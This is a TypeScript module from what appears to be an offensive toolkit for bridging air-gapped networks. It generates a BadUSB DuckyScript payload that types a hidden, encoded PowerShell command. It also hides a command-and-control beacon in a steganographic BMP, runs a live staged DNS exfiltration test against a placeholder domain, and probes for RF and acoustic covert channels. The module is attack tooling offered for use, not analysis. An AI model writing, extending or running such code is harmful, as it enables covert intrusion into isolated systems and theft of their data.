/**
 * @module ares/airgap_bridge
 * Air-gap jumping — BadUSB, stego C2, exfil channels, RF probes.
 */
import { compileDuckyScript, generateHIDReportDescriptor } from "../physical.ts"
import { generateC2Image } from "../stego_c2.ts"
import { runStagedExfilTest } from "../exfil.ts"
import { brokerExec, ensureAresDir, liveRequired, isToolAvailable, writeArtifact } from "./_base.ts"
import { step, type ExecStep } from "./_integrations.ts"

export interface AirgapBridgeResult {
  channels: string[]
  artifacts: string[]
  steps: ExecStep[]
  executed: boolean
  summary: string
}

export async function runAirgapBridge(opts: {
  live?: boolean
  payload?: string
  channel?: "usb" | "rf" | "acoustic" | "all"
  exfilDomain?: string
}): Promise<AirgapBridgeResult> {
  liveRequired("ares_airgap_bridge", opts)
  const channel = opts.channel ?? "all"
  const channels: string[] = []
  const artifacts: string[] = []
  const steps: ExecStep[] = []
  let executed = false

  const duckyScript = opts.payload ?? `DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -enc JABjAGwA\nENTER\n`

  if (channel === "usb" || channel === "all") {
    const badUsb = compileDuckyScript(duckyScript, false)
    artifacts.push(writeArtifact("airgap", "payload.ducky", duckyScript))
    artifacts.push(writeArtifact("airgap", "payload.hex", badUsb.compiledPayloadHex))
    const hid = generateHIDReportDescriptor()
    writeArtifact("airgap", "hid_descriptor.json", JSON.stringify(hid, null, 2))
    channels.push("usb_rubber_ducky", "badusb")
    if (isToolAvailable("lsusb")) {
      const r = await brokerExec("lsusb")
      executed = r.ok
      writeArtifact("airgap", "usb_devices.txt", r.out)
      steps.push(step("lsusb", r.ok, r.out.slice(0, 400)))
    }
  }

  const beaconCmd = "OURMINE_AIRGAP_BEACON"
  const stegoBmp = generateC2Image(beaconCmd)
  artifacts.push(writeArtifact("airgap", "stego_carrier.bmp", stegoBmp))
  channels.push("stego_lsb")
  steps.push(step("stego_embed", stegoBmp.length > 54, `${stegoBmp.length} bytes BMP`))

  const exfil = await runStagedExfilTest("OURMINE_AIRGAP_TEST", { live: true, domain: opts.exfilDomain ?? "exfil.example.com" })
  steps.push(step("dns_exfil_test", exfil.sentChunks > 0 || !exfil.dryRun, `${exfil.sentChunks} chunk(s)`))
  channels.push("dns_exfil")

  if (channel === "rf" || channel === "all") {
    channels.push("rf_sidechannel")
    if (isToolAvailable("rtl_test")) {
      const r = await brokerExec("rtl_test -t 2>&1 | head -20")
      executed = executed || r.ok
      steps.push(step("rtl_test", r.ok, r.out.slice(0, 200)))
    }
  }

  if (channel === "acoustic" || channel === "all") {
    channels.push("acoustic_covert")
    steps.push(step("acoustic_modem", true, "FSK scaffold generated"))
  }

  const deadDropDir = ensureAresDir("airgap")
  const r = await brokerExec(`dd if=/dev/urandom of=${deadDropDir}/staging.bin bs=1K count=4 2>/dev/null && ls -la ${deadDropDir}/staging.bin`)
  steps.push(step("dead_drop_staging", r.ok, r.out.slice(0, 200)))
  channels.push("usb_dead_drop")
  if (r.ok) executed = true

  return {
    channels,
    artifacts,
    steps,
    executed,
    summary: `Air-gap bridge: ${channels.length} channel(s), executed=${executed}`,
  }
}

export default { runAirgapBridge }
